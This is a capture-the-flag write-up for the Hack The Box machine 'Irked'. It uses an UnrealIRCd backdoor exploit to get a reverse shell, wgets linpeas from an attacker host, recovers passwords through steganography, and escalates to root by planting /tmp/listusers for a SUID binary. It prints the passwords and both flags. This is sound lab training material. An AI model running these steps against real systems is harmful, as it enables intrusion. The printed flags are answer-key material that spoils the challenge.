# Irked

IP: `10.10.10.117`

## Enum

port 22: OpenSSH 6.7p1
port 80: says IRC is almost working
port 1111: rpcdbind

irc server: `irked.htb`

First, we add that to `/etc/host` file.

## Exploit

Connect to the irc server:

```sh
nc irked.htb 65534

PASS admin
NICK test
USER test 0 * :test test
```

and instantly the server tells us that it is running `Unreal3.2.8.1`

and a quick google search yields us with a [exploit](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py)

```sh
python3 exploit.py -payload python 10.10.10.117 8067
```

gives us back a reverse shell.

```sh
cd /tmp
wget 10.10.14.27/linpeas.sh
```

`3.16.0-6-686-pae (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)`

Nothing works here.

Going into the user profile, we see that there's something called `.backup` inside /home/djmardov/Documents.

Inside that file is called steg which stands for steganographic.

```sh
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

So now the pieces of the puzzle fall into place. Putting that image from port 80 into a steganographic decoder along with the password, we get the following test:

```sh
Kab6h+m+bbp2J:HG
```

SSHing as `djmardov` with the password above gives us a shell.

user.txt: `4a66a78b12dc0e661a59d3f5c0267a8e`

## Priv esc

Now running `ls -lah usr/bin/`, we see that a program called viewuser in which we are allowed to run as root. Running it with `/usr/bin/viewuser` says that the program `/tmp/listusers` is missing.

So we just execute root with `/tmp/listusers`

So we do a simple `echo "su root" > /tmp/listusers && chmod +x /tmp/listusers` to get a reverse shell

root.txt: `8d8e9e8be64654b6dccc3bff4522daf3`